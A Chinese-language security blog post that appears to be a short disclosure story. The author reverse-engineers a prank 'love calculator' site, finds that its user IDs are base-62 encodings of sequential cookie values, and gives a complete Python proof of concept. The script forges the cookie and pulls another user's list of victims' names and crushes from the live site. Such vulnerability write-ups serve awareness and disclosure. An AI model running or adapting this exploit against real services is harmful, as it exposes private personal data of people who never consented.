# 資安小故事 000 - 餅乾猜猜樂

事情是這樣的，我在別人的挨居的自介上面看到一個連結，就好奇的點了進去

<img style="height: 500px;" src="../../../img/lovemeter-1.png">

裡面看起來就是那種心裡測驗的網站，愛情計算器，幫你測你和喜歡的人配不配

聰明如我<del>資安小天才</del>，當然是隨便亂打個 abcd 就送出看看這是在耍什麼花樣

<img style="height: 500px;" src="../../../img/lovemeter-2.png">

果然是愚弄人的網站，如果你誠實的填上你的名字和你喜歡的人的名字，就被分享給你連結的人看光光啦

在你生氣的同時，這個網站就很好心的讓你註冊一下好發洩怨氣

那我當然也順手按了一下註冊（免錢的隨手按一下），這時候就可以把連結分享給別人囉

這個可以看中了我的圈套的受害者名單的頁面，我只要把 cookie 清掉，就會被帶到前面第一個愛情計算器（陷阱）頁面，代表他有用 cookie 去驗證你是誰

* 有對的 cookie 他會給我受害者名單
* 不對的 cookie 他會讓我掉進陷阱

那在看看他的 cookie 之前眼尖的我，就發現他的 url 有些地方像像的，而且後面的 userid 很短

* `https://cn.lovemeter.me/user/5S1X`
* `https://cn.lovemeter.me/user/5S1Y`
* `https://cn.lovemeter.me/user/5S1Z`

多註冊幾次會發現，他的 userid 怎麼感覺好像是每次 counter++

再多嘗試幾次，就會發現 userid 的字元只會是 `0-9a-zA-Z` 的字元組成

然後重點是他的 cookie 是個數字，而且完完全全是 counter++ 的樣子

* `user_quiz_1399337=1399337`
* `user_quiz_1399337=1399338`
* `user_quiz_1399337=1399339`

那這個 userid 跟這個 cookie 的 id 的對照是怎麼樣的呢

猜一猜就能發現他其實是把 `0-9a-zA-Z` 當成 `0-61` 的 62 進位（很合理吧）

```python
convert('5S1X') =  5 * (62 ** 3) +
                  54 * (62 ** 2) +
                   1 * (62 ** 1) +
                  59 * (62 ** 0) = 1399337
```

那我們只要把他的 userid 轉回數字，並新增個 cookie，就能成功看到別人的受害者名單囉

## Proof Of Concept ( POC )

```python tab="source"
#!/usr/bin/env python3
import re
import sys
import json
import string
from prettytable import PrettyTable
import requests

if len(sys.argv) < 2:
    print('usage: ./lovemeter.py (url)')
    exit(0)

value = string.digits + string.ascii_letters

def uid2num(uid):
    num = 0
    for ch in uid:
        v = value.index(ch)
        num = num * len(value) + v
    return num

def num2uid(num):
    uid = ''
    while num > 0:
        v = num % len(value)
        uid += value[v]
        num //= len(value)
    return uid[::-1]

url = sys.argv[1]
r = re.search('https:\/\/(\w+)\.lovemeter.me\/\w+\/(\w+)', url)
prefix = r.group(1)
uid = r.group(2)
num = uid2num(uid)

r = requests.get(f'https://{prefix}.lovemeter.me/other-user-stats/{uid}', headers = {
    'cookie': f'user_quiz_{num}={num}',
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1'
})

data = json.loads(r.text)['data']
t = PrettyTable(['名字', '喜歡的人'])
for item in data:
    item = json.loads(item)
    t.add_row([item['userFullName'], item['crushFullName']])
print(t)
```

```bash tab="usage"
./lovemeter.py https://cn.lovemeter.me/user/1234
```
